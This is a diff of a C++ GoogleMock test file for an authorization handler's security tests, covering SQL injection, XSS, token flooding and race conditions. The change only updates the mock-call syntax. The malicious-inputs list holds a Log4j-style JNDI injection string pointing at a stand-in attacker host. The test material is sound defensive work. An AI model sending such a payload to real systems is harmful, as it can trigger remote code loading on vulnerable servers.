@@ -275,11 +275,11 @@ TEST_F(AuthSecurityTest, test_sql_injection_protection) {
     ProvidedIdToken malicious_token = create_security_token(MALICIOUS_TOKEN_SQL, connectors);
 
     EXPECT_CALL(mock_publish_token_validation_status_callback,
-                testing::Field(&ProvidedIdToken::id_token, malicious_token.id_token), 
-                TokenValidationStatus::Processing);
+                Call(Field(&ProvidedIdToken::id_token, malicious_token.id_token),
+                     TokenValidationStatus::Processing));
     EXPECT_CALL(mock_publish_token_validation_status_callback,
-                testing::Field(&ProvidedIdToken::id_token, malicious_token.id_token), 
-                TokenValidationStatus::Rejected);
+                Call(Field(&ProvidedIdToken::id_token, malicious_token.id_token),
+                     TokenValidationStatus::Rejected));
 
     const auto result = this->auth_handler->on_token(malicious_token);
     
@@ -301,7 +301,7 @@ TEST_F(AuthSecurityTest, test_xss_protection) {
     std::vector<int32_t> connectors{1};
     ProvidedIdToken xss_token = create_security_token(MALICIOUS_TOKEN_XSS, connectors);
 
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(1));
 
     const auto result = this->auth_handler->on_token(xss_token);
@@ -374,7 +374,7 @@ TEST_F(AuthSecurityTest, test_token_flooding_protection) {
     std::vector<int32_t> connectors{1, 2, 3};
     
     // Allow some calls but not all - system should have rate limiting
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(10))
         .Times(AtMost(200)); // Should not process all 1000 requests
 
@@ -454,7 +454,7 @@ TEST_F(AuthSecurityTest, test_concurrent_token_race_condition) {
     std::vector<int32_t> connectors{1};
     ProvidedIdToken test_token = create_security_token(VALID_SECURITY_TOKEN, connectors);
 
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(5));
 
     const int concurrent_requests = 10;
@@ -515,7 +515,7 @@ TEST_F(AuthSecurityTest, test_master_pass_security) {
     ProvidedIdToken legit_token1 = create_security_token("SECURITY_VALID_USER1", connectors);
     ProvidedIdToken legit_token2 = create_security_token("SECURITY_VALID_USER2", connectors);
 
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(4));
     EXPECT_CALL(mock_stop_transaction_callback, testing::_, testing::_)
         .Times(AtLeast(1));
@@ -627,7 +627,7 @@ TEST_F(AuthSecurityTest, test_unauthorized_transaction_stop) {
     ProvidedIdToken victim_token = create_security_token("SECURITY_VALID_VICTIM", connectors);
     ProvidedIdToken attacker_token = create_security_token("SECURITY_VALID_ATTACKER", connectors);
 
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(3));
 
     // Victim starts transaction
@@ -702,7 +702,7 @@ TEST_F(AuthSecurityTest, test_input_validation_edge_cases) {
         "${jndi:ldap://evil.com}", // Log4j style injection
     };
 
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(malicious_inputs.size()));
 
     int rejected_count = 0;
@@ -791,7 +791,7 @@ TEST_F(AuthSecurityTest, test_performance_under_security_load) {
     }
 
     // Allow reasonable number of callbacks
-    EXPECT_CALL(mock_publish_token_validation_status_callback, testing::_, testing::_)
+    EXPECT_CALL(mock_publish_token_validation_status_callback, Call(_, _))
         .Times(AtLeast(20))
         .Times(AtMost(100));
 
